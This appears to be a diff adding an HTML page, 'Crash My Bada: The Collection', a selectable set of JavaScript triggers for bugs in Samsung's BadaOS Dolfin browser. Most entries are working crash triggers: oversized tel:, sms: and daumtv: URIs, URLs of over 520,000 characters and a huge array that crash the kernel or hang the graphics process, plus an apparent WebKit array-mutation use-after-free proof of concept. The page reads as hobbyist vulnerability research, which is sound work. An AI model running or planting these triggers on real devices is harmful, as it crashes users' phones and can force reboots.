@@ -1,0 +1,196 @@
+<!DOCTYPE html>
+<title>Crash My Bada: The Collection</title>
+<h1>Crash My Bada: The Collection</h1>
+<h3 style="color: red;" id="warn"></h3>
+<select onchange="selchange()" id="mainselector">
+    <optgroup label="Minor bugs">
+        <option value="htmlparser">HTML Parser bug</option>
+        <option value="title">document.title readonly bug</option>
+        <option value="nulldomain">NULL character in domain cutoff bug</option>
+    </optgroup>
+    <optgroup label="Major bugs">
+        <option value="dialer">Dialer font corruption</option>
+        <option value="gpu">Graphics process hang</option>
+    </optgroup>
+    <optgroup label="Kernel crashes">
+        <option value="oom">Array OOM crash</option>
+        <option value="bigurl">520,189 char URL crash</option>
+        <option value="uaf">Tab close crash</option>
+        <option value="tel">tel: URI tab close crash</option>
+        <option value="urltab">Big url tab close crash</option>
+        <option value="cheese">Papa's Burgeria SWF load crash</option>
+        <option value="daumtv">DaumTV big URI Dolfin crash</option>
+        <option value="daumtvapp">DaumTV URI app crash</option>
+    </optgroup>
+    <optgroup label="experimental">
+        <option value="widget">widget</option>
+        <option value="locksc">locksc</option>
+        <option value="fileuri">fileuri</option>
+        <option value="webkit">webkit</option>
+    </optgroup>
+</select>
+<button onclick="doit()">do it</button>
+<p>Bug description:</p>
+<p id="description" style="font-size: small;"></p>
+<hr>
+<p>Output area:</p>
+<p id="output"></p>
+<script>
+    // check if we're on a bada device
+    var ua = navigator.userAgent.toLowerCase()
+    if (ua.match("dolfin|bada") == null){
+        document.getElementById("warn").innerText = "WARNING: you're not on a BadaOS device running Dolfin, some or all of the bugs won't work as described!\r\nYOU HAVE BEEN WARNED"
+    }
+    var sel = document.getElementById("mainselector");
+    var bugs = {
+        "htmlparser": {
+            "desc": "Dolfin is too forgiving to malformed HTML",
+            "func": function(){
+                var malformed = document.createElement("div");
+                malformed.innerHTML = "</<h1<.this text should never show up</h1>";
+                document.body.appendChild(malformed);
+            }
+        },
+        "title": {
+            "desc": "document.title does not change the titlebar in the UI",
+            "func": function(){
+                log("current title: " + document.title);
+                document.title = "example";
+                log("post-change: " + document.title);
+                log("titlebar changed? check it.");
+            }
+        },
+        "dialer": {
+            "desc": "opening a tel: URI with a long string of digits twice causes the dialer fonts to blank and become unreadable<br>(note: may work or not, it's unpredictable, if it doesn't disappear then you're out of luck)",
+            "func": function(){
+                window.open("tel:"+Array(10000 + 1).join("0"));
+                window.open("tel:"+Array(10000 + 1).join("0"));
+            }
+        },
+        "gpu": {
+            "desc": "opening an oversized tel: and an sms: link 2 times to cause font corruption using tel: results in a graphics hang and process hang that requires a reboot to use the browser again",
+            "func": function(){
+                window.open("tel:"+Array(10000 + 1).join("0"));
+                window.open("sms:"+Array(30 + 1).join("0"));
+                window.open("tel:"+Array(10000 + 1).join("0"));
+                window.open("sms:"+Array(30 + 1).join("0"));
+            }
+        },
+        "oom": {
+            "desc": "Kernel crash by making a large array, causing all of the RAM to be used up",
+            "func": function(){
+                var a = new Array(Math.pow(2, 32)-1).join("a");
+            }
+        },
+        "bigurl": {
+            "desc": "navigating to an url that has 520,189 or more characters crashes the kernel",
+            "func": function(){
+                location.href="http:\/\/"+Array(520182 + 1).join('a');
+            }
+        },
+        "uaf": {
+            "desc": "crash on tab close, reason unknown",
+            "func": function(){
+                // Bada doesn't render data: uri's, it just downloads them as Samsung_[i].[ext] (i starts from 1 if Samsung already exists)
+                var data = window.open("data:image/gif;base64,"+Array(1600 + 1).join("A"));
+                window.open("about:blank");
+                alert("close or switch to any tab for a kernel crash.");
+            }
+        },
+        "urltab": {
+            "desc": "opening 2 windows that have a 520,188 character URL crashes the kernel once the user tries to close any of the opened tabs",
+            "func": function(){
+                window.open('http:\/\/'+Array(520181 + 1).join('a'));
+                window.open('http:\/\/'+Array(520181 + 1).join('a'));
+                alert("close the last tab for a kernel crash");
+            }
+        },
+        "cheese": {
+            "desc": "loading a Papa's Burgeria SWF crashes the kernel. Reason unknown",
+            "func": function(){
+                var flashplayer = document.createElement("embed")
+                flashplayer.src = "cheese.swf";
+                document.body.appendChild(flashplayer)
+            }
+        },
+        "daumtv": {
+            "desc": "opening a DaumTV URI with 3,103 or more characters of any character after the daumtv:// protocol specifier, crashes the kernel",
+            "func": function(){
+                window.open("daumtv://" + Array(3103 + 1).join("a"));
+            }
+        },
+        "daumtvapp": {
+            "desc": "opening a DaumTV URI with 2 or more of any character after the daumtv:// protocol specifier, crashes the kernel after the DaumTV app loads and displays 'Connected'",
+            "func": function(){
+                window.open("daumtv://aa");
+            }
+        },
+        "tel": {
+            "desc": "opening a tel: link with a phone number that's 9,999 digits long twice using window.open crashes the kernel once the user tries to close any of the opened tabs in the browser",
+            "func": function(){
+                window.open("tel:"+Array(9999 + 1).join("0"));
+                window.open("tel:"+Array(9999 + 1).join("0"));
+                alert("close the last tab for a kernel crash");
+            }
+        },
+        "nulldomain":{
+            "desc": "Having a NULL character at any position in the URL, causes it to get cut off after the NULL character<br><br>likely source of bug:<br><code>SFBMpMakeHostUrl(int param_1,int param_2,undefined4 param_3,undefined4 param_4)</code> in decompiled WebKit DLL (DLL00111104.DLL)<br><code>DLL info:<br>DLL-Name: WebcontrolWebkit<br>DLL-Version: 1.2<br>DLL-Vendor: Apple<br>DLL-ID: 0x00111104<br>DLL-URL: /System/exe/Webkit.exe <br>DLL-Zip-Size: 100<br>path on FS: /Exe/DLL00111104.DLL</code><br>(firmware version: S7230EXEKF1)<br>specifically the <code>if ((uVar4 == 0x2f) || (uVar4 == 0)) break;</code> check",
+            "func": function(){
+                window.open("http://www.c\0antseeme.xyz.co.ltd");
+            }
+        },
+        "widget": {
+            "desc": "experimental entry for testing",
+            "func": function(){
+                // widget object testing, grep for them using `grep -ri "widget\."` after you extracted the `FactoryFs_S7230E_Open_Europe_Slav.ffs` off the firmware using TestDisk (it's just a FAT32 partition)
+                // update: found full list in WebKit DLL (/Exe/DLL00111104.DLL, off: 0x9501CA)
+                log(bondi)
+            }
+        },
+        "fileuri":{
+            "desc":"experimental",
+            "func":function(){
+                location.href = "file:///Media/Others/changerr.html";
+            }
+        },
+        "webkit":{
+            "desc":"do i even need to tell you?",
+            "func":function(){
+                var name = [1.2, 3.4, 5.6, 7.8, 9]; // hehe 9's lonely lmao
+                var ohgodohfuck = name.map(function(val, idx){
+                    if (idx == 1){
+                        name.length = 0;
+                        // steal and replace with replica to not make wk notice
+                        for (var i = 0; i < 100; i++){
+                            name[i] = {h: 1337}
+                        }
+                    }
+                    return val
+                });
+                for (var j = 0; j < 100; j++){
+                    log(j + " " + ohgodohfuck[j].h)
+                }
+            }
+        }
+    }
+    selchange();
+    function doit(){
+        try{
+            var bug = bugs[sel.value];
+            log("triggering " + sel.value + "...");
+            bug.func();
+            log("end of " + sel.value);
+        }
+        catch (e){
+            log("error occurred during execution: " + e)
+        }
+    }
+    function selchange(){
+        document.getElementById("output").innerText = "";
+        var bug = bugs[sel.value];
+        document.getElementById("description").innerHTML = bug.desc;
+    }
+    function log(line){
+        document.getElementById("output").innerText += "[*] " + line + "\r\n";
+    }
+</script>
